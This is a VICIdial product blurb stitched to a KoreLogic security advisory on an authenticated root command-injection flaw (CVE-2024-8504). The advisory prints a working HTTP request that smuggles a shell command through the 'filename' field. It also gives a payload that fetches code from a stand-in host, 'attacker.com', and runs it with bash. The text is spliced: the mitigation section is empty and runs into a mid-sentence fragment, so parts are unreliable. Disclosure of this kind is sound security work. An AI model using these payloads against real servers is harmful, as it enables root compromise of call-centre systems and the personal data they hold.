The agent interface is an interactive set of web pages that work through a web browser to give real-time information and functionality with nothing more than an internet browser on the client computer.  The management interface is also web-based and offers the ability to view many real-time and summary reports as well as many detailed campaign and agent options and settings.  VICIDIAL can function as an ACD for inbound calls or for Closer calls coming from VICIDIAL outbound fronters and even allows for remote agents logging in from remote locations as well as remote agents that may only have a phone.  There are currently over 24,000 installations of VICIDIAL in production in over 100 countries around the world, several with over 300 agent seats and many with multiple locations.  The software suite also includes a from-scratch software installation document, full English and Spanish versions of the web-clients and admin pages(and functional versions of several other languages), and is designed to work with an Asterisk system that has Zap/DAHDI(T1/E1/PSTN) telco lines or VOIP(IAX or SIP) trunks and many different kinds of softphones and hardphones. This group of applications is designed to run on top of almost any version of Asterisk so no messing around with the Asterisk source code is necessary. For more information see the system requirements at the bottom of the page.  **MAJOR VICIDIAL FEATURES:**  * Inbound, Outbound and Blended call handling and Inbound Email handling* Outbound

KL-001-2024-012: VICIdial Authenticated Remote Code Execution
Title: VICIdial Authenticated Remote Code Execution
Advisory ID: KL-001-2024-012
Publication Date: 2024-09-10
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-012.txt
1. Vulnerability Details
Affected Vendor: VICIdial
Affected Product: VICIdial
Affected Version: 2.14-917a
Platform: GNU/Linux
CWE Classification: CWE-78: Improper Neutralization of Special
Elements used in an OS Command
('OS Command Injection')
CVE ID: CVE-2024-8504
2. Vulnerability Description
An attacker with authenticated access to VICIdial as an "agent"
can execute arbitrary shell commands as the "root" user. This
attack can be chained with CVE-2024-8503 to execute arbitrary
shell commands starting from an unauthenticated perspective.
3. Technical Description
VICIdial is an open-source contact center suite, mainly used
by call centers. The "vicidial.com" website boasts over 14,000
registered installations. There is a public SVN repository to
access the source code, as well as an ISO that can be used to
install the software. The ISO was used in a virtual machine
for testing purposes.
Users can be added to specific "groups" that enable them to log
into the "agent" web client if that group is associated with a
"campaign". This web client is for agents to manage inbound
and outbound phone calls, displaying pertinent information
regarding the "lead", such as the personal information of the
individual on the other end of the call.
An agent has the ability to record the phone call using the
"START RECORDING" button. When clicked, an HTTP request is sent
to the server which is processed by the "manager\_send.php"
PHP script. The "filename" parameter included in the request
is sanitized with the "preg\_replace" PHP function to prevent
SQL injection, as shown by this snippet:
if (isset($\_GET["filename"])) {$filename=$\_GET["filename"];}
elseif (isset($\_POST["filename"])) {$filename=$\_POST["filename"];}
...
$filename = preg\_replace("/\'|\"|\\\\|;/","",$filename);
The regular expression used to sanitize this parameter is
very permissive, only removing single quotes, double quotes,
backslashes, and semicolons.
Later in the execution of "manager\_send.php", the "filename"
variable is added to a SQL database through an "INSERT"
statement, along with other user-controlled variables such as
"exten":
$stmt="INSERT INTO vicidial\_manager values('','','$NOW\_TIME',
'NEW','N','$server\_ip','','Originate','$vmgr\_callerid',
'Channel: $channel','Context: $ext\_context',
'Exten: $exten','Priority: $ext\_priority',
'Callerid: $filename','','','','','');";
if ($format=='debug') {echo "\n";}
$rslt=mysql\_to\_mysqli($stmt, $link);
On the server-side, an asyncronous cron job is executing the
perl script "ADMIN\_keepalive\_ALL.pl":
vicibox11:/ # crontab -l | grep keepalive
### keepalive script for astguiclient processes
\* \* \* \* \* /usr/share/astguiclient/ADMIN\_keepalive\_ALL.pl
This perl script ensures several worker perl scripts
are running. Included in these worker perl scripts is
"AST\_manager\_send.pl", as shown by this snippet from
"ADMIN\_keepalive\_ALL.pl":
if ($psline[1] =~ /AST\_manager\_se/)
{
$runningAST\_send++;
if ($DB) {print "AST\_send RUNNING: |$psline[1]|\n";}
}
...
if ( ($AST\_send\_listen > 0) && ($runningAST\_send < 1) )
{
if ($DB) {print "starting AST\_manager\_send...\n";}
# add a '-L' to the command below to activate logging
`/usr/bin/screen -d -m -S ASTsend
$PATHhome/AST\_manager\_send.pl $debug\_string`;
The "AST\_manager\_send.pl" script will continuously monitor the
"vicidial\_manager" table in the SQL database for records with
the "status" column equal the string "NEW". Values from that
row are then URL-encoded and used as command-line arguments
to invoke the "AST\_send\_action\_child.pl" perl script:
while ($endless\_loop > 0)
{
my $stmtA = "SELECT count(\*) from
vicidial\_manager where server\_ip = '"
. $conf{VARserver\_ip} . "' and status = 'NEW';";
...
$originate\_command .= $vdm->{cmd\_line\_e} . "\n"
if ($vdm->{cmd\_line\_e});
$originate\_command .= $vdm->{cmd\_line\_f} . "\n"
if ($vdm->{cmd\_line\_f});
$originate\_command .= $vdm->{cmd\_line\_g} . "\n"
if ($vdm->{cmd\_line\_g});
...
$vdm->{cmd\_line\_e} =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
$vdm->{cmd\_line\_f} =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
$vdm->{cmd\_line\_g} =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
...
$launch .= " --cmd\_line\_e=" . $vdm->{cmd\_line\_e}
if ($vdm->{cmd\_line\_e});
$launch .= " --cmd\_line\_f=" . $vdm->{cmd\_line\_f}
if ($vdm->{cmd\_line\_f});
$launch .= " --cmd\_line\_g=" . $vdm->{cmd\_line\_g}
if ($vdm->{cmd\_line\_g});
...
$launch .= " >> " . $conf{PATHlogs} . "/action\_send." . logDate()
if ($SYSLOG);
system($launch . ' &');
The "AST\_send\_action\_child.pl" will then initiate a telnet
connection to the "Asterisk Call Manager" and issue various
commands as they appear in the command-line arguments:
my $tn = new Net::Telnet (Port => $telnet\_port,
Prompt => '/\r\n/',
Output\_record\_separator => '',
Errmode => "return");
...
$tn->open("$telnet\_host");
$tn->waitfor('/Asterisk Call Manager\//');
...
$originate\_command .= $cmd\_line\_e . "\n" if ($cmd\_line\_e);
$originate\_command .= $cmd\_line\_f . "\n" if ($cmd\_line\_f);
$originate\_command .= $cmd\_line\_g . "\n" if ($cmd\_line\_g);
...
my @list\_channels = $tn->cmd(String => $originate\_command,
Prompt => '/.\*/');
These commands are then processed by the Asterisk
Management interface (AMI). The configuration file
"extensions-vicidial.conf" contains useful information on
how AMI processes the value of the user-controlled "Exten"
command. The following is a relevant snippet:
exten => 8309,1,Answer
exten => 8309,2,Monitor(wav,${CALLERID(name)})
exten => 8309,3,Wait(3600)
exten => 8309,4,Hangup()
...
When supplying an "Exten" value of "8309", the "Monitor"
application is invoked, which will record the current call and
write the recorded data into a file. The default directory
is "/var/spool/asterisk/monitor". In this case, the name
of the file is derived from the "CALLERID", which is also
user-controlled.
This can be leveraged by an attacker to write file names
that contain malicious shell commands. Take for example the
following HTTP request:
POST /agc/manager\_send.php HTTP/1.1
Host: REDACTED
Content-Length: 279
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
server\_ip=REDACTED&session\_name=1716765726\_8300defaul17394646&user=korelogic&pass=korelogic&ACTION=MonitorConf&format=text&channel=Local/58600051@default&filename=3133731337$(id>foobar.txt)&exten=8309&ext\_context=default&lead\_id=&ext\_priority=1&FROMvdc=YES&uniqueid=&FROMapi=
Two files are created within the "/var/spool/asterisk/monitor"
directory:
vicibox11:/ # ls -l /var/spool/asterisk/monitor
total 216
-rw-r--r-- 1 root root 213164 May 30 05:30 \
3133731337$(id>foobar.txt)-in.wav
-rw-r--r-- 1 root root 44 May 30 05:30 \
3133731337$(id>foobar.txt)-out.wav
Additionally, the "AST\_CRON\_audio\_1\_move\_VDonly.pl" perl script
is executed every 3 minutes:
vicibox11:/ # crontab -l | grep VDonly
0,3,6,9,12,15,18,21,24,27,30,33,36,39,42,45,48,51,54,57 \* \* \* \* \
/usr/share/astguiclient/AST\_CRON\_audio\_1\_move\_VDonly.pl
This script searches for WAV/GSM files within the Asterisk
monitor directory and uses the file names to execute several
shell commands:
foreach(@FILES)
{
...
$INfile = $FILES[$i];
...
if (!$T)
{
`mv -f "$dir1/$INfile" "$dir2/$ALLfile"`;
`rm -f "$dir1/$OUTfile"`;
}
The malicious file name is then inserted into the "mv"
command. The attacker controlled "id" command is executed and
the output is redirected to the file "foo.txt":
vicibox11:/ # ls -l /root/foobar.txt
-rw-r--r-- 1 root root 39 May 30 05:33 /root/foobar.txt
4. Mitigation and Remediation Recommendation

can be downloaded and executing using the cURL utility. The following
file name is an example:
$(curl$IFS@attacker.com$IFS-o$IFS.c&&bash$IFS.c)
This issue can be chained with KL-001-2024-011 (unauthenticated SQL injection)
to execute arbitrary shell commands as the root user from an unauthenticated
perspective:
